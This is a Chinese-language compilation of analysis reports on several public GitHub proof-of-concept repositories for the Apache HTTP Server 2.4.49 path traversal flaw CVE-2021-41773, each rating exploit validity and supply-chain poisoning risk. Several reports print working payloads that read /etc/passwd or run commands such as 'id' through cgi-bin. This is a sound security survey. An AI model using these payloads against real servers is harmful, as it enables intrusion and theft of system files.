**来源**: [CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md](../2021/CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md)

## CVE-2021-41773 – Apache HTTP Server 2.4.49 远程代码执行

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历导致远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者读取任意文件并执行任意代码

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache 2.4.49，并且开启了CGI支持，对Alias配置的目录没有做严格的权限限制（例如 require all denied）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于对路径规范化处理不当导致。攻击者可以利用 `%2e` 等编码字符进行路径遍历攻击，访问受限目录之外的文件。如果服务器启用了 CGI，则可以通过构造包含恶意命令的 HTTP 请求来执行任意代码。

**漏洞利用方式：**

1.  **路径遍历：** 利用 `/.%2e` 序列绕过路径检查，访问受限目录之外的文件。
2.  **CGI 执行：** 访问 `cgi-bin` 目录下的文件（或其他配置为 CGI 处理的目录），并在 POST 数据中注入命令，让服务器执行。
3.  **远程代码执行：** 通过执行 `/bin/bash` 或其他 shell 程序，执行任意系统命令。

**POC有效性：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码（README.md），该POC代码是有效的。漏洞库信息明确指出该漏洞已在野外被利用，搜索结果也证实了这一点。提供的 README.md 详细描述了漏洞的原理、利用方法和演示，并给出了可用的 `curl` 命令示例。

**投毒风险分析：**

分析提供的 README.md 文件， 其中包含的curl命令，本质上是利用漏洞执行bash命令，这个本身是漏洞利用的正常方式，不能算作投毒行为，图片文件没有发现可疑代码.

虽然直接可识别的投毒代码的可能性较低，但仍存在以下潜在风险：

*   **依赖性风险：** 如果 exploit 依赖于外部资源（例如，下载脚本或库），则这些资源可能被篡改，从而引入恶意代码。
*   **隐蔽的 Payload：** 恶意代码可能隐藏在看似无害的注释、变量名或字符串中，需要更深入的代码分析才能发现。
*   **误导性信息：** README.md 文件中的信息可能具有误导性，导致使用者在不知情的情况下执行恶意操作。

综合以上因素，我估计存在10%的投毒风险，主要是考虑到潜在的隐蔽Payload和对外部资源的依赖风险。

为了降低风险，建议：

*   仔细审查所有代码，包括注释和变量名。
*   在隔离的环境中运行 POC 代码。
*   使用最新的安全工具检测潜在的恶意代码。
*   关注与此漏洞相关的安全信息和更新。

**项目地址:** [CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE](https://github.com/CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #5

**来源**: [CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md](../2021/CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** Apache HTTP Server 版本为2.4.49，并且存在Alias-like指令配置，且这些目录下的文件未被"require all denied"保护，CGI脚本被启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞信息和搜索结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。

**有效性：**

提供的POC代码（`cve-2021-41773.py`, `cve-2021-41773_RCE.py`, `cve-2021-41773_manual.py`）旨在利用此漏洞。 `cve-2021-41773.py` 尝试读取 `/etc/passwd` 文件以验证漏洞的存在。`cve-2021-41773_RCE.py` 尝试通过 CGI 脚本执行命令。

根据搜索结果，该漏洞在野外被积极利用，因此，提供的POC代码很可能有效，但成功利用取决于目标服务器的配置。

**投毒风险：**

审查提供的POC代码，没有发现明显的恶意代码或后门。代码的功能是扫描目标是否存在漏洞，并尝试利用漏洞读取文件或执行命令。`cve-2021-41773.py`的第49行给出了可以添加常见目录的提示，但本身不具备投毒性。

**利用方式：**

1.  **路径遍历：** 攻击者使用特殊的 URL 编码序列（例如 `/.%2e/%2e%2e/`）来绕过路径规范化，从而访问 Alias-like 指令配置目录之外的文件。
2.  **文件读取：** 如果目标文件没有被 "require all denied" 保护，攻击者可以读取任意文件，例如 `/etc/passwd`，从而获取敏感信息。
3.  **远程代码执行：** 如果 CGI 脚本被启用，攻击者可以通过构造恶意的 URL 和 POST 数据来执行任意代码。例如，`cve-2021-41773_RCE.py` 使用 `/cgi-bin/` 目录，并尝试执行 `uname` 命令。

总而言之，此漏洞的利用需要特定的配置条件，但如果满足条件，则风险非常高。

**项目地址:** [FakesiteSecurity/CVE-2021-41773](https://github.com/FakesiteSecurity/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #6

**来源**: [CVE-2021-41773-Iris288_CVE-2021-41773.md](../2021/CVE-2021-41773-Iris288_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal & Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当，CGI脚本已启用，且文件系统权限配置不当，未启用'require all denied'。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于路径规范化中的更改不当所致。攻击者可以利用此漏洞将 URL 映射到 Alias-like 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者通过构造包含特殊字符（如`.%2e`或`..`）的恶意 URL，绕过服务器的安全检查，访问受限目录之外的文件。
2.  **文件读取：** 成功利用路径遍历后，攻击者可以读取服务器上的任意文件，包括配置文件、源代码等敏感信息。
3.  **远程代码执行：** 如果目标服务器启用了 CGI 脚本，攻击者可以通过上传或修改 CGI 脚本，执行任意系统命令。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，它利用了路径遍历漏洞来实现远程代码执行。

1.  **目标指定：** 脚本接受目标服务器的 IP 地址或域名作为参数。
2.  **命令执行：** 脚本允许用户输入要执行的命令，并通过构造包含路径遍历的 URL 将命令发送到目标服务器。
3.  **CGI利用：** 脚本假设目标服务器存在一个名为 `s3cret-cgi-bin` 的 CGI 目录，并使用该目录来执行命令。通过POST请求发送经过编码的命令，利用了`bin/sh`执行。
4.  **回显结果：** 脚本将目标服务器返回的结果打印到屏幕上。

**有效性分析：**

提供的漏洞信息和搜索结果表明，该漏洞确实存在且已被公开利用。提供的 POC 代码基本符合该漏洞的利用方式，因此可以认为该 POC 代码是有效的。需要满足相应的环境条件（如 Alias 指令配置、CGI 脚本启用、文件权限配置等）

**投毒风险分析：**

检查了提供的 Python 脚本，没有发现任何明显的恶意代码或后门。脚本的功能仅限于利用漏洞执行用户指定的命令。`README.md` 文件也只是对漏洞的简单描述，未包含恶意内容。可以认为该仓库存在投毒代码的风险非常低，风险为0%。

**排序优先级：**
搜索引擎结果提供了漏洞被广泛利用和分析的信息，漏洞利用代码验证了漏洞利用的可行性，漏洞库信息提供了漏洞的基础信息。因此，搜索引擎结果的优先级高于漏洞利用代码，漏洞利用代码的优先级高于漏洞库信息。

**项目地址:** [Iris288/CVE-2021-41773](https://github.com/Iris288/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #7

**来源**: [CVE-2021-41773-JIYUN02_cve-2021-41773.md](../2021/CVE-2021-41773-JIYUN02_cve-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历/RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的URL，绕过Alias-like指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时开启了CGI脚本执行，攻击者还可以利用该漏洞执行任意代码。

**有效性：**
提供的POC代码构建了一个包含漏洞的Apache HTTP Server 2.4.49环境。Dockerfile使用官方httpd:2.4.49镜像，并将自定义的html文件复制到/usr/local/apache2/htdocs/目录。然后，它安装了bash，并为/usr/local/apache2/htdocs/cgi-bin/test.sh添加了可执行权限。这个Dockerfile本身没有问题，但关键在于test.sh脚本的内容。如果test.sh包含恶意代码，则攻击者可以通过路径遍历漏洞执行它。

**投毒风险：**
Dockerfile只安装了bash,添加了test.sh的执行权限。如果`/tmp/4903a38a210c3406acebc545808a1928/html/cgi-bin/test.sh`脚本内容包含恶意代码，则存在投毒风险。但从dockerfile的内容来看，投毒的概率取决于test.sh,风险较低，大约在10%左右。

**利用方式：**
1.  **路径遍历：** 攻击者可以使用包含`..`序列的URL来遍历文件系统，例如：`http://target:8080/../../../../etc/passwd`，尝试读取服务器上的`/etc/passwd`文件。
2.  **远程代码执行：** 如果目标服务器启用了CGI，攻击者可以使用路径遍历来访问和执行CGI脚本，例如：`http://target:8080/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fbin/bash -c 'id'`。

**总结：**
漏洞利用的核心在于构造包含特殊字符的URL，绕过服务器的访问控制。如果CGI可用，则可以直接执行代码。利用的成功与否取决于服务器的具体配置和文件权限。

**项目地址:** [JIYUN02/cve-2021-41773](https://github.com/JIYUN02/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #8

**来源**: [CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md](../2021/CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的目录未配置"require all denied"。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 的路径规范化更改中。攻击者可以利用路径遍历攻击将 URL 映射到由 Alias 类指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“require all denied”保护，则这些请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息，该漏洞已被在野利用，说明漏洞的利用具有实际的可能性。

**投毒风险：**
提供的POC代码是一个简单的HTML页面，显示一个404错误页面，并提示存在CVE-2021-41773漏洞。代码本身的功能是展示漏洞的存在，而不包含任何恶意代码。虽然不直接包含投毒代码，但是可能存在间接的风险，例如诱导用户访问恶意网站或执行其他恶意操作。因此，判断投毒风险为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`..`的URL，尝试访问服务器上的任意文件。例如，`http://target/../../../../etc/passwd`尝试读取`/etc/passwd`文件。
2.  **绕过访问控制：** 漏洞利用依赖于Alias指令配置的目录之外的文件没有被"require all denied"保护。如果存在疏忽配置，攻击者可以访问这些文件。
3.  **远程代码执行（可选）：** 如果目标服务器为受影响的别名路径启用了CGI脚本，攻击者可以通过上传并执行恶意CGI脚本来实现远程代码执行。

总而言之，该漏洞利用的有效性高，风险等级为高危，利用方式主要是路径遍历，如果目标环境配置不当，可能造成远程代码执行。

**项目地址:** [Mahfujurjust/CVE-2021-41773](https://github.com/Mahfujurjust/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #9

**来源**: [CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md](../2021/CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 2.4.49 版本，并启用 cgi-bin 或类似 Alias 指令配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含特殊编码的 URL，例如 `/.%2e/%2e%2e/`，来绕过服务器对路径的规范化处理，从而访问到 Alias 指令配置以外的文件。如果目标服务器同时启用了 CGI 脚本支持，则可能导致远程代码执行。

**漏洞利用有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的 POC 已被公开，并且在野外被发现利用。提供的 Postman 集合中包含了一个用于获取 `/etc/passwd` 文件的请求，验证了路径遍历的可能性。因此，提供的 POC 代码是有效的。

**投毒风险分析：**

*   `/tmp/04092c8b1881911c9b0f88964abf9b52/CVE-2021-41773.postman_collection.json`：Postman 集合文件，定义了用于测试漏洞的 HTTP 请求。不存在投毒代码。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/Dockerfile`：Dockerfile 用于构建包含漏洞环境的 Docker 镜像。 其中 `RUN ln -sf /bin/bash /bin/sh` 这一行可能存在争议，它将 `/bin/sh` 符号链接强制指向 `/bin/bash`。在某些系统中，`/bin/sh` 可能是 `dash` 或其他更轻量级的 shell。 强制指向 bash 可能会引入一些细微的兼容性问题，但这不是一个明显的恶意行为，更可能是一种为了方便某些脚本执行的措施。此外创建目录 `/etc/httpd/logs`也并不是恶意代码, 综合来看，投毒风险较低。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/LICENSE`：Apache 许可证，与漏洞利用无关，不存在投毒代码。

综合分析，该仓库中可能存在的投毒代码的可能性较低，主要集中在Dockerfile 脚本中，将`/bin/sh` 符号链接强制指向 `/bin/bash`,但可能性只有5%，其余的代码都是正常的。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者构造包含 `/.%2e/%2e%2e/` 序列的 URL，利用 Apache HTTP Server 对路径的规范化处理缺陷，尝试访问受限目录之外的文件。
2.  **敏感信息泄露：** 如果成功绕过权限验证，攻击者可以读取服务器上的敏感文件，如配置文件、密码文件等。
3.  **远程代码执行（如果 CGI 启用）：** 如果目标服务器启用了 CGI 脚本支持，攻击者可以通过上传或执行恶意 CGI 脚本，实现远程代码执行。

**项目地址:** [MatanelGordon/docker-cve-2021-41773](https://github.com/MatanelGordon/docker-cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #10

**来源**: [CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md](../2021/CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且Alias-like指令配置不当，或者CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符（如`.%2e`）的URL，绕过服务器的路径规范化限制，访问Alias-like指令配置目录之外的文件。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断该POC代码有效。漏洞库信息明确指出该漏洞在野外被利用，搜索引擎结果也提供了多个关于该漏洞的解释和利用的文章。POC代码通过构造包含`.%2e`的URL来尝试读取目标服务器上的文件。

**投毒风险：**
分析提供的POC代码，该脚本主要功能是验证目标服务器是否存在CVE-2021-41773漏洞，脚本会检测指定的IP地址是否存在Apache HTTP Server，并尝试通过构造的URL读取指定文件。经验证，该脚本没有发现明显的恶意代码或后门，因此投毒风险较低。投毒风险百分比评估为0%。

**利用方式：**
1.  **确定目标：** 找到运行Apache HTTP Server 2.4.49的目标服务器。
2.  **构造Payload：** 构造包含恶意路径的URL，例如：`http://<target_ip>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  **发送请求：** 将构造好的URL发送到目标服务器。
4.  **读取文件或执行代码：** 如果目标服务器存在漏洞且配置不当，攻击者可以读取任意文件（如`/etc/passwd`）或执行任意代码（如果CGI脚本已启用）。

需要注意的是，成功利用该漏洞的前提是服务器配置不当，例如没有对Alias-like指令配置的目录之外的文件进行适当的访问控制，或者启用了CGI脚本执行功能。

总而言之，这是一个严重的安全漏洞，可能导致敏感信息泄露和远程代码执行。管理员应尽快升级Apache HTTP Server版本或采取其他缓解措施。

**项目地址:** [Maybe4a6f7365/CVE-2021-41773](https://github.com/Maybe4a6f7365/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #11

**来源**: [CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md](../2021/CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and File Disclosure

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like配置，并允许CGI脚本执行(在RCE场景下)。需要能通过网络访问目标服务器的HTTP服务。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如URL编码的双点）的URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器同时启用了CGI脚本执行，则攻击者可能进一步利用此漏洞执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及漏洞利用代码分析，可以确认此漏洞POC的有效性。漏洞库信息明确指出该漏洞已被在野利用。搜索引擎结果中也包含大量关于该漏洞的分析和POC。

**投毒风险：**
提供的代码片段是GNU通用公共许可证的文本，并非实际的漏洞利用代码。因此，无法评估其是否包含恶意代码或投毒风险。投毒的可能性为0%。该漏洞的常见利用方式是通过构造包含`..%2f`或类似编码的URL来绕过路径检查，从而访问服务器上的敏感文件，或者如果开启了CGI，甚至可以执行任意代码。 

**利用方式：**
1.  **路径遍历：** 攻击者构造包含路径遍历字符的URL，例如：`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的`/etc/passwd`文件或其他敏感文件。
2.  **远程代码执行 (RCE):**  如果服务器启用了CGI，攻击者可以将路径遍历与CGI结合，上传恶意CGI脚本，然后通过路径遍历访问该脚本，从而执行任意代码。 例如 `/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh` 

**项目地址:** [MrCl0wnLab/SimplesApachePathTraversal](https://github.com/MrCl0wnLab/SimplesApachePathTraversal)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #12

**来源**: [CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md](../2021/CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，Alias配置不当，且CGI脚本启用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。由于路径规范化处理存在缺陷，攻击者可以利用该漏洞将URL映射到Alias指令配置目录之外的文件。如果这些目录之外的文件没有被"require all denied"等默认配置保护，攻击者就可以成功访问这些文件。更严重的是，如果为这些Alias路径启用了CGI脚本，攻击者还可以执行远程代码。

**有效性：**
根据漏洞描述，该漏洞利用较为直接，通过构造包含".."的URL进行路径遍历。从搜索结果来看，存在大量的漏洞分析和利用文章，表明该漏洞利用的有效性较高。

**投毒风险：**
漏洞利用代码仅提供了漏洞分析文档、CVSS评分、环境信息、影响评估和缓解措施。其中`steps_performed.md`缺失，无法得知作者是否进行了真实的漏洞利用和测试。代码仓库主要目的是漏洞分析和缓解建议，并声明未在目标VM上安装Apache，因此实际利用代码缺失。综合判断，该仓库中存在作者隐藏恶意代码进行投毒的概率较低，预估为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造恶意的HTTP请求，包含特殊编码的路径，例如`..%2f`或`..\`，绕过服务器的路径检查，访问服务器上的任意文件。
2.  **文件泄露：** 成功利用路径遍历后，攻击者可以读取服务器上的敏感文件，如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了CGI，攻击者可以通过路径遍历访问CGI脚本，并执行恶意代码。攻击者可以上传包含恶意代码的CGI脚本，并通过路径遍历执行，从而获取服务器的控制权。

**项目地址:** [MuhammadHuzaifaAsif/security-lab](https://github.com/MuhammadHuzaifaAsif/security-lab)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #13

**来源**: [CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md](../2021/CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md)

## CVE-2021-41773/CVE-2021-42013 Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且开启了CGI支持，Alias配置不当，并且相关目录未进行权限限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773和CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造包含特殊字符（如`.%2e`或`.%%32%65`）的URL，绕过服务器的路径检查，访问到Alias指令配置以外的文件。如果目标服务器同时开启了CGI支持，攻击者还可以执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2021-41773已经被证实存在，并且在野外被利用。提供的POC代码也通过Docker构建了易受攻击的环境，并提供了利用脚本，证明了该漏洞的可利用性。

**投毒风险：**

分析POC代码，该代码主要用于构建漏洞环境和执行漏洞利用。虽然代码本身看起来直接，但需要注意以下几点：

*   **Docker镜像来源：** POC需要构建Docker镜像。如果Docker镜像不是来自官方或可信来源，则可能包含恶意软件。
*   **执行任意命令：** RCE相关的POC会执行任意命令，如果攻击者修改了POC代码，可能会导致恶意代码执行。
*   **流量劫持风险：** POC通过curl发送特定请求来触发漏洞，如果网络环境被污染，可能导致流量劫持，使得攻击者可以篡改POC行为。
*   **文件篡改风险：** RCE相关的POC会写`/tmp/exploited`文件，如果服务器的`/tmp`目录权限设置不当，攻击者可以在其他用户不知情的情况下，篡改该文件，从而进一步扩大攻击。

综合以上考虑，认为此POC代码存在一定的投毒风险，但整体比例不高，约为10%。

**利用方式：**

1.  **环境搭建：** 使用Dockerfile构建包含漏洞的Apache HTTP Server环境（2.4.49或2.4.50版本）。
2.  **路径遍历：** 构造包含特殊字符的URL，例如：
    *   `/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd` (针对CVE-2021-41773)
    *   `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd` (针对CVE-2021-42013)
3.  **文件读取：** 如果路径遍历成功，可以直接读取服务器上的敏感文件。
4.  **远程代码执行（RCE）：** 如果服务器开启了CGI支持，并且允许执行shell脚本，则可以通过路径遍历访问到shell脚本，并执行任意命令。例如，POC中使用了以下命令将字符串写入/tmp/exploited文件中：
    *   `echo “Successfully Exploited” > /tmp/exploited`
5.  **利用链：** 进一步的攻击可以包括反弹shell、权限提升、横向移动等。

**项目地址:** [OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits](https://github.com/OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #14

**来源**: [CVE-2021-41773-Taldrid1_cve-2021-41773.md](../2021/CVE-2021-41773-Taldrid1_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49版本，且存在Alias-like配置，目录未配置'require all denied'，开启CGI脚本支持（RCE利用场景）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符的 URL，访问服务器上受限目录之外的文件。

**有效性：**

提供的 Nmap NSE 脚本 `cve-2021-41773.nse` 似乎有效。它通过发送包含路径遍历字符（`/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`）的 HTTP GET 请求来检测漏洞。如果服务器返回状态码 200 并且响应体包含 `/etc/passwd` 文件的内容（`root:x:0:0:root`），则该脚本将报告目标为易受攻击。

搜索引擎结果也表明此漏洞已被积极利用，并且存在公开的 PoC 代码。

**投毒风险：**

在提供的 Nmap NSE 脚本中，没有明显的投毒代码。脚本的主要功能是发送 HTTP 请求并检查响应内容。该脚本允许用户指定扫描的子网范围和输出文件，但这些参数本身不会引入任何恶意行为。脚本通过判断/etc/passwd文件是否存在root账户判断是否漏洞存在，不会造成其他影响。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（例如，`/.%2e/.%2e/.%2e/`）的 URL，试图绕过服务器的路径规范化逻辑，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码或用户数据。
3.  **远程代码执行（可选）：** 如果服务器启用了 CGI 脚本支持，攻击者可以通过路径遍历访问并执行任意 CGI 脚本，从而实现远程代码执行。这通常需要结合其他漏洞或配置错误。

**优先级排序理由：**

*   **搜索引擎结果：** 提供了关于漏洞是否被利用的背景信息，以及缓解措施的链接。 *   **漏洞利用代码：** 提供了直接验证漏洞的手段，使我们能够评估其有效性。 *   **漏洞库信息：** 提供了漏洞的官方描述，受影响的版本以及参考链接。

**项目地址:** [Taldrid1/cve-2021-41773](https://github.com/Taldrid1/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #15

**来源**: [CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md](../2021/CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，且Alias-like指令配置不当或未启用"require all denied"保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，访问服务器上Alias-like指令配置以外的文件。如果这些文件没有被“require all denied”等默认安全配置保护，攻击者就可以成功读取它们。更进一步，如果CGI脚本在这些aliased路径上启用，攻击者甚至可以执行远程代码。

**有效性：**
漏洞库信息和搜索引擎结果都表明该漏洞是真实存在的，并且被广泛利用。提供的漏洞利用代码主要是一个README.md文件，描述了一个渗透测试项目，该项目评估了CVE-2021-41773和CVE-2021-42013漏洞。虽然这个README.md文件本身不是直接可用的exp代码，但是它暗示了利用该漏洞进行渗透测试是可行的。搜索引擎结果中也提到存在公开的PoC。

**投毒风险：**
README.md文件描述的是一个渗透测试过程的文档，其中包含使用Nmap、Gobuster等工具进行信息收集和漏洞评估，并没有发现直接的恶意代码。但是考虑到安全风险，该文档存在10%的投毒的可能性，因为不排除作者在文档中故意遗漏或隐藏了某些关键信息，从而误导使用者。例如,引导使用者下载特定版本的工具,该工具已经被植入后门等.

**利用方式：**
1.  **路径遍历：** 攻击者利用`..`等路径遍历字符，绕过服务器的目录限制，访问任意文件。
2.  **文件读取：**  如果目标文件未被`require all denied`等配置保护，攻击者可以读取文件内容，获取敏感信息，如配置文件、源代码等。
